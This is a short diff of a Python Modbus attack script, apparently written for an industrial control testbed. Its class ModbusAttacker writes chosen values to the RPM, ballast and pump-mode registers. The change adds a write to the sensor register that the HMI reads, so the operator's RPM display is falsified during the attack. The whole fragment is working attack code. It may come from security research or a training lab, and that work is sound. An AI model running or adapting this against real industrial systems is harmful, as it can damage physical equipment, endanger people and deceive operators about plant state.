@@ -25,7 +25,8 @@ log = logging.getLogger(__name__)
 # =========================
 # Register Map
 # =========================
-RPM_REGISTER = 0
+RPM_REGISTER = 0          # Legacy (not used by HMI)
+RPM_SENSOR_REGISTER = 10  # HMI reads this for RPM (Field Zone sensor)
 BALLAST_REGISTER = 1
 PUMP_MODE_REGISTER = 2
 
@@ -151,11 +152,12 @@ class ModbusAttacker:
 
                 # Execute writes
                 r1 = self.safe_write_register(RPM_REGISTER, rpm_value, "RPM")
-                r2 = self.safe_write_register(BALLAST_REGISTER, ballast_x10, "Ballast")
-                r3 = self.safe_write_register(PUMP_MODE_REGISTER, pump_mode_u16, "PumpMode")
+                r2 = self.safe_write_register(RPM_SENSOR_REGISTER, rpm_value, "RPM_Sensor")
+                r3 = self.safe_write_register(BALLAST_REGISTER, ballast_x10, "Ballast")
+                r4 = self.safe_write_register(PUMP_MODE_REGISTER, pump_mode_u16, "PumpMode")
 
-                attempted += 3
-                successful += sum([r1, r2, r3])
+                attempted += 4
+                successful += sum([r1, r2, r3, r4])
 
                 # Display attack status
                 ballast_val = ballast_x10 / 10.0
